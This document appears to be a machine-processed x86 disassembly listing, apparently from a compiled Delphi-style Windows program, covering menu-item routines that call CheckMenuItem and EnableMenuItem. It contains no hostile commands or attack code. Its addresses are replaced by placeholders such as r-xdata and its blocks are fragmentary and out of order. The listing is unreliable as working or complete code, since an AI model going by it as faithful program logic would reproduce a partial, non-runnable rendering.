jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_4681e4
mov esi eax
mov eax edi
call sub_467800
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404388
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402bf8
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404014
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_465310
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404288
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467a65
lea eax [ ebp - 0x24 ]
call sub_403f7c
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46624c
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_467a90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404388
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403fd0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_467ab8
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_467c28
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_467c38
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_467b00
sub_467b00
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4661bc
push eax
call CheckMenuItem
mov eax esi
call sub_467ab8
sub_467b54
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_467c28
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4661bc
push eax
call EnableMenuItem
sub_467bcc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_467f8c
mov edx eax
mov ecx ebx
mov eax edi
call sub_46615c
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_467ab8
sub_467c38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418dc4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_465264
sub_467ca8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_467c28
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_467c90
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_467fc0
mov ecx ebx
mov edx esi
mov eax edi
call sub_467db4
sub_467cf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_467c28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_467c38
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_467d48
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_467c28
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_467c38
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_467c38
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_467db4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_465264
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_46615c
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_418e40
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_46802c
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_467c28
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46608c
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418dc4
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418dc4
mov dl [ eax + 0x3f ]
mov eax esi
call sub_467bcc
sub_467e68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_465264
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_467c28
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46608c
mov eax ebx
call sub_467c28
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418dc4
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418cb4
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_467edc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_467b00
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_467c10
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_467c10
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_467fa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_467c28
mov edx eax
mov ecx esi
mov eax ebx
call sub_467db4
pop esi
pop ebx
retn
sub_467fc0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_467f8c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_467e68
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_465264
sub_467fe8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_46802c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_46802c
jmp r-xdata
mov eax ebx
call sub_46608c
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_469d04
sub_468084
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebx + 0x4c ] eax
sub_4680ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4031ec
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_468340
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4033e8
mov edx ebx
mov eax edi
call sub_4213bc
mov eax ebx
mov si 0xffee
call sub_4033e8
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_46811c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ esi + 0x4c ] eax
sub_468150
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_467c28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_467c38
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_468190
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_467fc0
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_467fa4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_467fa4
sub_4681f4
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_467ab8
sub_468220
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_467a90
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_467b00
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_467b54
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403fd0
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_467c80
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_467bcc
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_467c5c
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_467c70
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_468340
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_467c10
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4033e8
sub_468364
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_468384
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4683a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4683c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4683e4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_468404
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_468424
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_468444
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_468464
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_468484
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4194bc
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_46227c
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_4623b4
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_462414
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_462114
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_4624d4
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4684fc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421608
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_467c10
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4680ac
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_468550
jmp r-xdata
xor edx edx
mov eax esi
call sub_466014
sub_468550
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_4639e8
mov eax ebx
call sub_4685c0
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_463a2c
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_4213bc
sub_468598
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_468598
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4656e8
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_46802c
mov eax ebx
pop esi
pop ebx
retn
sub_4685d4
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c830
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044dc
sub_468604
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404014
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_468688
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4687aa
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40423c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40423c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_40449c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404388
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4687b1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fa0
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404524
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042fc
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40423c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_40449c
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4042fc
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_4687e8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_468c87
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404014
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_468c48
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_467c28
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404014
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468c8e
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403fa0
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403fa0
lea eax [ ebp - 0x18 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
call sub_468e3c
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_467c38
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404388
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_468604
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_467c38
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_467c38
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4031ec
mov eax [ ebp - 0x20 ]
call sub_4031ec
mov eax [ ebp - 0x14 ]
call sub_4031ec
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_468604
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40423c
cmp ebx eax
jle r-xdata
